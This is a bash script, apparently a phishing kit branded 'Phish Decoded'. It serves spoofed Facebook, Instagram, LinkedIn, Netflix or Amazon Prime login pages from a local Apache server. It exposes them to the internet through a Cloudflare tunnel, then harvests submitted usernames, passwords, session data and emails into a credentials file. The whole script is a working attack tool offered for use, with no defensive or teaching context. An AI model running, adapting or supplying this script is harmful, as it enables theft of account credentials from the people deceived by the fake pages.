#!/bin/bash 

#Function to copy files
copyingfile()
{
	echo -e "You have choosen $1  \n"
        sudo cp sites/$1/* /var/www/html/
	sudo echo -n > /var/www/html/credentials.txt
	sudo chmod ogu+xwr /var/www/html/credentials.txt
	echo -e "\n$1" >> all-credentials.txt
}

#Checking Cloudflared File
cloudflared()
{
if [ -f "cloudflared-linux-amd64" ]; then
	echo -e "Cloudflared Working... \n"
else
	echo -e "Intsalling Cloudflared... \n"
	wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
	chmod +x cloudflared-linux-amd64
fi
}

#Creating Cloudflared link
link()
{
	echo -e "Generating Link for you... \n"
	sleep 3
	chmod +x cloudflared-linux-amd64
	./cloudflared-linux-amd64 --url 127.0.0.1/
	echo -e "\nYour data has been stored successfully in all-credentials.txt\n"

	#Displaying and storing credentials
	sudo grep -e user -e pass -e session -e email  /var/www/html/credentials.txt
	sudo grep -e user -e pass -e session -e email  /var/www/html/credentials.txt >> all-credentials.txt
}

#Deleting Instagram images
deleting_instagram_images()
{
sudo rm /var/www/html/apple-store.png /var/www/html/content.jpg /var/www/html/favicon.png /var/www/html/play-store.png /var/www/html/smart-phone-2x.png /var/www/html/smart-phone.png
}

# Function to display the banner
show_banner() {
    echo -e "\033[1;36m"
echo "███████████  █████       ███          █████"
echo "░░███░░░░░███░░███       ░░░          ░░███"
echo " ░███    ░███ ░███████   ████   █████  ░███████"
echo " ░██████████  ░███░░███ ░░███  ███░░   ░███░░███"
echo " ░███░░░░░░   ░███ ░███  ░███ ░░█████  ░███ ░███"
echo " ░███         ░███ ░███  ░███  ░░░░███ ░███ ░███"
echo " █████        ████ █████ █████ ██████  ████ █████"
echo "░░░░░        ░░░░ ░░░░░ ░░░░░ ░░░░░░  ░░░░ ░░░░░"
echo ""
echo " ██████████                                  █████              █████"
echo "░░███░░░░███                                ░░███              ░░███"
echo " ░███   ░░███  ██████   ██████   ██████   ███████   ██████   ███████"
echo " ░███    ░███ ███░░███ ███░░███ ███░░███ ███░░███  ███░░███ ███░░███"
echo " ░███    ░███░███████ ░███ ░░░ ░███ ░███░███ ░███ ░███████ ░███ ░███"
echo " ░███    ███ ░███░░░  ░███  ███░███ ░███░███ ░███ ░███░░░  ░███ ░███"
echo " ██████████  ░░██████ ░░██████ ░░██████ ░░████████░░██████ ░░████████"
echo "░░░░░░░░░░    ░░░░░░   ░░░░░░   ░░░░░░   ░░░░░░░░  ░░░░░░   ░░░░░░░░ "
    echo -e "\033[0m"
}

		#Main

#Displaying Banner
show_banner

#Giving website options
sleep 1
echo -e 'Choose which website you want to spoof \n'
echo -e '[1] Facebook'
echo -e '[2] Instagram'
echo -e '[3] Linkedin'
echo -e '[4] Netflix'
echo -e '[5] Amazon prime \n'
read website

#Starting Apache2 server
echo -e "\nStarting Apache2 service... \n"
sudo service apache2 start

#Checking which website user chose
if [ $website = 1 ]; then
	copyingfile "Facebook"
	cloudflared
	link

elif [ $website = 2  ]; then
	copyingfile "Instagram"
	cloudflared
	link
	deleting_instagram_images

elif [ $website = 3  ]; then
        copyingfile "Linkedin"
	cloudflared
	link

elif [ $website = 4  ]; then
	copyingfile "Netflix"
	cloudflared
	link

elif [ $website = 5  ]; then
	copyingfile "Prime"
	cloudflared
	link

else
	echo -e "Choose from 1 to 5"
fi
